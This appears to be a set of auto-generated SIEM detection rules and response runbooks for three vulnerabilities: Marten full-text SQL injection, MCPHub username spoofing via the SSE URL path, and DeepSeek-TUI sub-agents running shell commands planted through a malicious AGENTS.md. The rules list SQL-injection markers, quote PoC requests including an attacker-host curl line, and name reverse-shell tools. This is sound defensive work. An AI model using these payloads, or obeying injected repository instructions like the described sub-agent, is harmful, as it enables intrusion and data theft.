Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorized DBA pasting / replaying CVE-2026-45288 PoC payloads inside the DB for vulnerability validation
  • Regression tests (Marten's own `full_text_regconfig_sql_injection.cs` suite) executing against a non-prod replica that ships logs to the same SIEM
  • DBA `EXPLAIN ANALYZE` runs against attacker queries captured from earlier audit logs
  • Backup-restore operations replaying historical query traffic in a recovery environment
Suppression filter
| where Detail !contains "application_name=psql"  // optional: exclude DBA interactive shell sessions when they're authorized — confirm the DBA list before applying
Response runbook
1. Triage: pull the full log line plus surrounding 30s window — extract the database user, client_addr, application_name, and full statement text; correlate `application_name` back to the offending app pool / service account. Pivot UC1 against the same time window to find the originating HTTP request and client IP. 2. Contain: terminate the active DB session (`pg_terminate_backend(pid)`), rotate the application's DB role credentials, and either revoke unnecessary privileges (DROP, CREATE) from the app role or block the WAF / app boundary as per UC2 workaround. 3. Hunt: review `pg_stat_statements` / pgaudit for the past 30 days for additional `to_tsvector('` queries with anomalous shapes; check for any successful DDL against `mt_doc_*` tables, SELECT statements against `pg_user`/`pg_shadow`/`information_schema`, or `COPY ... FROM PROGRAM` / `lo_export` attempts indicating post-injection RCE pivots.
let LookbackDays = 7d;
let DbSqliMarkers = dynamic(["pg_sleep(", "DROP TABLE mt_doc_", "drop table mt_doc_", "'; SELECT version", "'::text); SELECT", "'::text);SELECT", "'::text);"]);
union isfuzzy=true
  (Syslog
    | where TimeGenerated > ago(LookbackDays)
    | where ProcessName has_any ("postgres", "postgresql", "postmaster")
    | where SyslogMessage has "to_tsvector('"
    | where SyslogMessage has_any (DbSqliMarkers)
    | extend SourceTable = "Syslog",
             Host = Computer,
             Detail = SyslogMessage),
  (CommonSecurityLog
    | where TimeGenerated > ago(LookbackDays)
    | where DeviceProduct has_any ("postgres", "postgresql", "pgaudit")
    | where Message has "to_tsvector('"
    | where Message has_any (DbSqliMarkers)
    | extend SourceTable = strcat(DeviceVendor, "/", DeviceProduct),
             Host = DeviceAddress,
             Detail = Message)
| project TimeGenerated, SourceTable, Host, Detail
| order by TimeGenerated desc

MCPHub SSE endpoint accessed with arbitrary username in URL path (CVE-2025/GHSA-wf8q-wvv8-p8jf hunt) AIExploitation Medium
Hunts the vulnerable MCPHub URL pattern `/<user>/sse[/<group>]` on web access logs. Because the username segment is taken straight from the path with no auth, any GET to this pattern from a low-volume / non-allow-listed source — or with an unusual `<user>` token — is the primary spoofing signal pre-patch (< 0.12.15). Rationale: Lifted the literal vulnerable route `/:user/sse/:group(.*)?` from src/server.ts (lines 132-161) and the PoC URL `http://TARGET:3100/CEO-admin-impersonated/sse` directly. Cross-checked at cvereports.com and vulert.com — both confirm the URL shape is the attack surface and that any unauthenticated GET to it creates a session. Defender XDR has no native web-access table for an internal Node.js app, hence empty defender_kql. Cross-checked against: • https://github.com/advisories/GHSA-wf8q-wvv8-p8jf • https://cvereports.com/reports/GHSA-WF8Q-WVV8-P8JF • https://vulert.com/vuln-db/-samanhappy-mcphub--sse-endpoint-accepts-arbitrary-username-from-url-path-without-authentication--en---
ATT&CKT1190 T1078
Data sourcesWeb
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate MCPHub clients (Claude Desktop, Cursor, internal AI agents) connecting under valid usernames after upgrade to 0.12.15 with bearer auth disabled
  • Internal load-balancer / Kubernetes ingress health probes that pre-warm the SSE path
  • SAST / DAST scanners (Nuclei, Burp, ZAP) hitting the path as part of authorized scanning windows
  • Application performance monitoring (Datadog Synthetics, Pingdom) configured against /<user>/sse for uptime checks
  • Pre-patch legitimate use — the vulnerable code path was the documented integration route for MCPHub
Suppression filter
// Suppress known internal scanners + health probes + the post-patch known-good user roster
| where SrcIP !in ("10.0.0.50","10.0.0.51") // synthetic-monitoring jump boxes
| where UA !has "DatadogSynthetics" and UA !has "Pingdom" and UA !has "kube-probe"
| extend KnownUser = UserSegment in~ ("alice","bob","svc-mcp-prod")  // populated from IdentityInfo
| where not KnownUser
Response runbook
1. Triage: pull `@samanhappy/mcphub` version from the host (`npm ls @samanhappy/mcphub` or container image label). If < 0.12.15 OR `enableBearerAuth` is false in mcp_settings.json, treat all SSE hits as suspect. Enumerate distinct UserSegment values seen in the last 7 days and compare against the actual IdP user roster. 2. Contain: front MCPHub with auth-required reverse proxy (mTLS or bearer header validation), enforce network ACL so MCPHub only accepts loopback / VPN / known-CIDR clients, upgrade to >= 0.12.15. 3. Hunt: pivot SrcIP → other MCPHub instances in the org, search OfficeActivity / audit logs for tool-call side effects attributed to spoofed users in the same window, and check downstream MCP-server logs (filesystem, GitHub, database connectors) for actions credited to the spoofed identity.
// MCPHub SSE impersonation pattern — pre-patch (< 0.12.15)
// Username taken straight from URL path; any GET to /<user>/sse[/<group>] is the attack shape.
union isfuzzy=true
  (W3CIISLog
   | where TimeGenerated > ago(7d)
   | where csMethod == "GET"
   | where csUriStem matches regex @"^/[^/]+/sse(/.*)?$"
   | extend UserSegment = extract(@"^/([^/]+)/sse", 1, csUriStem)
   | extend SourceTable = "W3CIISLog", SrcIP = cIP, Url = strcat(csUriStem, iff(isnotempty(csUriQuery), strcat("?", csUriQuery), "")), Method = csMethod, Status = tostring(scStatus), UA = csUserAgent),
  (CommonSecurityLog
   | where TimeGenerated > ago(7d)
   | where RequestMethod =~ "GET"
   | where RequestURL matches regex @"(?i)^(?:https?://[^/]+)?/[^/?]+/sse(?:/[^?]*)?(?:\?.*)?$"
   | extend UserSegment = extract(@"(?i)/([^/]+)/sse", 1, RequestURL)
   | extend SourceTable = "CommonSecurityLog", SrcIP = SourceIP, Url = RequestURL, Method = RequestMethod, Status = tostring(EventOutcome), UA = RequestClientApplication)
| where isnotempty(UserSegment)
| where UserSegment !in~ ("api","static","assets","health","favicon.ico","robots.txt","_next","public")
| project TimeGenerated, SourceTable, SrcIP, Computer, Method, Url, UserSegment, Status, UA
| order by TimeGenerated desc

MCPHub identity spoofing — admin-themed username in /<user>/sse path AIExploitation High
High-fidelity alert for GHSA-wf8q-wvv8-p8jf exploitation: requests to MCPHub `/<user>/sse` where the user-segment matches privileged-role keywords (admin, administrator, root, sudo, owner, superuser, sysadmin, ceo, cfo, cto, operator) or the literal PoC string `CEO-admin-impersonated`. Because the segment is taken verbatim as the authenticated identity, an admin-themed token in the path is the cleanest impersonation tell. Rationale: Anchored on the PoC's literal `CEO-admin-impersonated` segment plus the documented impact: 'Impersonate any user, including administrators.' Privileged-role tokens in the URL segment are the highest-signal impersonation indicator because the vulnerable middleware uses the segment verbatim as `IUser.username`. Corroborated against vulert.com and cvereports.com which both echo the admin-impersonation impact. Cross-checked against: • https://github.com/advisories/GHSA-wf8q-wvv8-p8jf • https://vulert.com/vuln-db/-samanhappy-mcphub--sse-endpoint-accepts-arbitrary-username-from-url-path-without-authentication--en---
ATT&CKT1190 T1078.003 T1078
Data sourcesWeb
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Tenant where an admin user genuinely has username `admin` / `administrator` (legitimately connecting their own client)
  • Penetration testers running authorized GHSA-wf8q-wvv8-p8jf validation
  • Security scanners (Nuclei templates) probing for the CVE
  • Service accounts named with `sysadmin` / `operator` legitimately using MCPHub
  • Synthetic monitoring that intentionally uses an `admin` username to verify the patch
Suppression filter
| where SrcIP !in ("10.0.0.50","10.0.0.51") // sanctioned pentest jump boxes
| where UA !has "Nuclei" and UA !has "DatadogSynthetics"
Response runbook
1. Triage: confirm MCPHub package version on Computer. If < 0.12.15 with `enableBearerAuth=false`, treat the alert as a confirmed identity-spoofing attempt. Identify SrcIP and check whether it is internal (employee VPN) or external (internet-facing). 2. Contain: block SrcIP at the perimeter, force-disconnect the SSE session (`pkill node` or restart MCPHub process), upgrade package to >= 0.12.15, enable bearer auth and rotate any bearer keys. 3. Hunt: pivot to the downstream MCP servers (file system, GitHub, database connectors) that were reachable via this MCPHub instance and audit their activity for the spoofed-user time window — the impersonation is upstream but the damage is in the downstream tool calls.
// MCPHub admin-themed identity spoofing (GHSA-wf8q-wvv8-p8jf)
let AdminTokens = dynamic(["admin","administrator","root","sudo","owner","superuser","sysadmin","ceo","cfo","cto","cio","operator","god","impersonated"]);
union isfuzzy=true
  (W3CIISLog
   | where TimeGenerated > ago(7d)
   | where csMethod == "GET"
   | where csUriStem matches regex @"^/[^/]+/sse(/.*)?$"
   | extend UserSegment = tolower(extract(@"^/([^/]+)/sse", 1, csUriStem))
   | extend SrcIP = cIP, Url = csUriStem, UA = csUserAgent, SourceTable="W3CIISLog"),
  (CommonSecurityLog
   | where TimeGenerated > ago(7d)
   | where RequestMethod =~ "GET"
   | where RequestURL matches regex @"(?i)^(?:https?://[^/]+)?/[^/?]+/sse(?:/[^?]*)?(?:\?.*)?$"
   | extend UserSegment = tolower(extract(@"(?i)/([^/]+)/sse", 1, RequestURL))
   | extend SrcIP = SourceIP, Url = RequestURL, UA = RequestClientApplication, SourceTable="CommonSecurityLog")
| where isnotempty(UserSegment)
| mv-apply tok = AdminTokens to typeof(string) on (
    where UserSegment contains tok
    | summarize MatchedTokens = make_set(tok)
  )
| where array_length(MatchedTokens) > 0
| project TimeGenerated, SourceTable, SrcIP, Computer, Url, UserSegment, MatchedTokens, UA
| order by TimeGenerated desc

MCPHub SSE user-segment fan-out — single source spawning sessions under multiple usernames AIReconnaissance High
Detects a single source IP creating MCPHub SSE sessions under three or more distinct `<user>` URL segments within a 10-minute window — the textbook impersonation-probing / user-enumeration pattern enabled by GHSA-wf8q-wvv8-p8jf. Legitimate clients connect under one identity per host. Rationale: Threshold-based: legitimate MCPHub clients connect under one consistent username per host. A SrcIP cycling through 3+ distinct `<user>/sse` segments in 10m is enumeration / impersonation probing — the only realistic explanation given the article's documented `req.params.user` design flaw. Sigma omitted because this is a cross-event aggregation. Datadog query is filter-only; the count/dcount threshold is enforced in the Cloud SIEM rule wrapper (groupBy SrcIP, count_unique UserSegment >= 3). Cross-checked against: • https://github.com/advisories/GHSA-wf8q-wvv8-p8jf • https://cvereports.com/reports/GHSA-WF8Q-WVV8-P8JF
ATT&CKT1087 T1190 T1078
Data sourcesWeb
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • NAT'd egress IP behind which multiple legitimate MCPHub users share the same SrcIP (employee VPN concentrator, corporate proxy)
  • Shared CI/CD runner that authenticates several pipeline service identities against MCPHub
  • Multi-tenant MCPHub deployments where one frontend IP fronts many tenants
  • Authorized red-team testing of the CVE
  • Load-test tooling iterating over synthetic user identities
Suppression filter
// Suppress known NAT/proxy egress IPs and CI runners after they've been profiled
| where SrcIP !in ("10.10.10.1","203.0.113.10")   // corp VPN concentrator + CI runner egress
| where DistinctUsers >= 3   // keep the floor; raise if NAT egress baseline higher
Response runbook
1. Triage: list the ObservedUsers set and cross-check against IdentityInfo / HR roster. If any segment is not a real user (e.g. `admin-test`, `impersonated`, random tokens) treat as confirmed. If SrcIP is a known proxy/NAT, normalize by X-Forwarded-For (W3CIISLog: enable XFF logging) and re-evaluate. 2. Contain: block SrcIP at perimeter, terminate active SSE sessions on the MCPHub host, upgrade @samanhappy/mcphub to >= 0.12.15 and switch enableBearerAuth=true. 3. Hunt: for each ObservedUser, query downstream MCP-server tool-call logs for actions credited to that identity within the SSE session window; review database / GitHub / filesystem MCP-server audit trails for unauthorized reads or writes attributed to the impersonated user.
// MCPHub user-segment fan-out — single SrcIP, multiple distinct <user>/sse spoof attempts in 10m
let WindowSize = 10m;
union isfuzzy=true
  (W3CIISLog
   | where TimeGenerated > ago(7d)
   | where csMethod == "GET"
   | where csUriStem matches regex @"^/[^/]+/sse(/.*)?$"
   | extend UserSegment = tolower(extract(@"^/([^/]+)/sse", 1, csUriStem)), SrcIP = cIP, Url = csUriStem, SourceTable="W3CIISLog"),
  (CommonSecurityLog
   | where TimeGenerated > ago(7d)
   | where RequestMethod =~ "GET"
   | where RequestURL matches regex @"(?i)^(?:https?://[^/]+)?/[^/?]+/sse(?:/[^?]*)?(?:\?.*)?$"
   | extend UserSegment = tolower(extract(@"(?i)/([^/]+)/sse", 1, RequestURL)), SrcIP = SourceIP, Url = RequestURL, SourceTable="CommonSecurityLog")
| where isnotempty(UserSegment)
| where UserSegment !in~ ("api","static","assets","health","favicon.ico","_next","public")
| summarize
    DistinctUsers = dcount(UserSegment),
    ObservedUsers = make_set(UserSegment, 30),
    Hits = count(),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated),
    SampleUrls = make_set(Url, 10)
    by SrcIP, Computer, bin(TimeGenerated, WindowSize)
| where DistinctUsers >= 3   // empirical fan-out threshold — one legit client = one identity per host
| order by DistinctUsers desc, LastSeen desc

MCPHub tool execution via spoofed identity — POST to /<user>/messages with JSON-RPC body AIActions on Objectives High
Detects the second-stage exploitation after a spoofed SSE handshake (GHSA-wf8q-wvv8-p8jf): POST to `/<user>/messages?sessionId=<uuid>` with a JSON-RPC tool call. This is where the spoofed identity is used to actually invoke MCP tools (filesystem, GitHub, DB connectors) under the impersonated user's authorization context. Rationale: The article's PoC Step 3 explicitly shows `curl -X POST http://TARGET:3100/CEO-admin-impersonated/messages?sessionId=54efc6f5-... -d '{"jsonrpc":"2.0","method":"tools/call",...}'`. The URL shape `/<user>/messages?sessionId=<uuid>` is unique to MCPHub (the JSON-RPC tool-call ingress for the SSE transport) and represents the actual exploitation step — not just probing. Cross-checked against: • https://github.com/advisories/GHSA-wf8q-wvv8-p8jf
ATT&CKT1059 T1190 T1078
Data sourcesWeb
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate MCPHub clients on patched instances invoking tools normally (the URL shape persists post-patch — it's the supported transport)
  • Authorized penetration testing of the CVE
  • Internal AI agents (Claude Desktop, Cursor) sending tool calls during normal operation
  • Synthetic monitoring exercising tool calls for uptime checks
  • Backup / replication tooling proxying MCP traffic
Suppression filter
// Once instance is patched + bearer auth on, this is benign traffic. Suppress when Authorization header is present.
// W3CIISLog doesn't carry headers; CSL has RequestHeader fields on some proxies — refine when available.
| where SrcIP !in ("10.10.10.20","10.10.10.21")   // sanctioned MCP client subnet
| where UA !has "Claude-Desktop" and UA !has "Cursor" and UA !has "mcp-client"
Response runbook
1. Triage: extract UserSegment + SessionId; correlate with the preceding SSE handshake (UC1/UC2 same SessionId or same SrcIP within seconds). Confirm MCPHub version < 0.12.15 or `enableBearerAuth=false`. Pull request body from reverse-proxy logs if available — JSON-RPC `method` and `params.name` reveal which MCP tool was invoked. 2. Contain: kill the SSE session (restart MCPHub or close the upstream socket), block SrcIP, upgrade to >= 0.12.15, enable bearer auth, rotate any secrets the impersonated tool could have read (DB creds, GitHub tokens, filesystem secrets). 3. Hunt: pivot to each named MCP server's audit log (filesystem.read, github.create_pr, db.query, etc.) for actions attributed to UserSegment in the SessionId's lifetime; assess data exfil and write-side actions; review IdP logs to check whether the spoofed UserSegment is a real privileged user whose downstream credentials may have been used.
// MCPHub tool-call execution against a spoofed SSE session (GHSA-wf8q-wvv8-p8jf, post-handshake)
union isfuzzy=true
  (W3CIISLog
   | where TimeGenerated > ago(7d)
   | where csMethod == "POST"
   | where csUriStem matches regex @"^/[^/]+/messages$"
   | where csUriQuery has "sessionId="
   | extend UserSegment = extract(@"^/([^/]+)/messages", 1, csUriStem),
            SessionId   = extract(@"sessionId=([0-9a-fA-F-]{20,})", 1, csUriQuery),
            SrcIP = cIP, Url = strcat(csUriStem, "?", csUriQuery), UA = csUserAgent, SourceTable="W3CIISLog"),
  (CommonSecurityLog
   | where TimeGenerated > ago(7d)
   | where RequestMethod =~ "POST"
   | where RequestURL matches regex @"(?i)^(?:https?://[^/]+)?/[^/?]+/messages\?.*sessionId=[0-9a-f-]{20,}"
   | extend UserSegment = extract(@"(?i)/([^/]+)/messages", 1, RequestURL),
            SessionId   = extract(@"(?i)sessionId=([0-9a-fA-F-]{20,})", 1, RequestURL),
            SrcIP = SourceIP, Url = RequestURL, UA = RequestClientApplication, SourceTable="CommonSecurityLog")
| where isnotempty(UserSegment) and isnotempty(SessionId)
| project TimeGenerated, SourceTable, SrcIP, Computer, Url, UserSegment, SessionId, UA
| order by TimeGenerated desc

DeepSeek-TUI sub-agent shell execution via AGENTS.md prompt injection (CVE-2026-45374) AIExploitation High
Hunts exploitation of CVE-2026-45374 where deepseek-tui's task_create tool spawns durable sub-agents with allow_shell=true and auto_approve=true defaults. A malicious AGENTS.md in a cloned repo injects shell commands (e.g. 'curl -s http://attacker/...') that execute without user approval. Detection pivots on the deepseek-tui binary spawning shell utilities or HTTP-egress LOLBins. Rationale: Article specifies the exact binary name 'deepseek-tui' (rust:deepseek-tui < 0.8.26) and shows the PoC payload as 'curl -s http://[collaborator]/badge-gen?project=web-service' executed via the sub-agent's shell. Parent=deepseek-tui spawning curl/wget/bash/python with HTTP URLs or shell -c flags is the highest-fidelity behavioural marker — deepseek-tui itself talks to the DeepSeek API directly (not via curl), so any forked shell/HTTP utility is anomalous and indicates the prompt-injection-driven sub-agent shell escape. External corroboration: confirmed deepseek-tui is a real Rust CLI (deepseek-ai/awesome-deepseek-agent repo) and a separate active campaign abuses fake deepseek-tui repos for malware delivery (cybersecuritynews.com), increasing the prior on this being targeted. Cross-checked against: • https://github.com/deepseek-ai/awesome-deepseek-agent/blob/main/docs/deepseek-tui.md • https://cybersecuritynews.com/hackers-use-fake-deepseek-tui-github-repositories/amp/ • https://github.com/advisories/GHSA-72w5-pf8h-xfp4
ATT&CKT1059.004 T1059.006 T1105 T1204.003
Data sourcesEndpoint.Processes
// CVE-2026-45374: deepseek-tui sub-agent shell exec (MDE Linux/macOS)
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "deepseek-tui"
   or InitiatingProcessFolderPath has "deepseek-tui"
| where FileName in~ ("curl","wget","bash","sh","zsh","dash","ksh","fish",
                      "nc","ncat","socat","python","python3","perl",
                      "ruby","node","powershell","pwsh")
| where ProcessCommandLine has_any ("http://","https://","/dev/tcp/","base64 -d","-c ","-s ")
   or FileName in~ ("nc","ncat","socat")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
// CVE-2026-45374: deepseek-tui sub-agent shell exec — ASIM cross-vendor
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has "deepseek-tui"
| where TargetProcessName has_any ("curl","wget","bash","sh","zsh","dash","ksh","fish",
                                   "nc","ncat","socat","python","python3","perl",
                                   "ruby","node","powershell","pwsh")
| where TargetProcessCommandLine has_any ("http://","https://","/dev/tcp/","base64 -d","-c ","-s ")
   or TargetProcessName has_any ("nc","ncat","socat")
| project TimeGenerated, DvcHostname, ActorUsername,
          ParentProcessName, ParentProcessCommandLine,
          TargetProcessName, TargetProcessCommandLine, SHA256
| order by TimeGenerated desc

// Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-45374: DeepSeek TUI: task_create Insecure Defaults En
// Hunts the actual binaries / paths / commandline fragments named
// in the article instead of a generic technique-class template.

// File-creation events for the named binaries / paths
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified")
| where (FolderPath has_any ("/tmp/poc-task-create", "/dev/null"))
| project Timestamp, DeviceName, AccountName, FolderPath,
          FileName, ActionType, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp desc
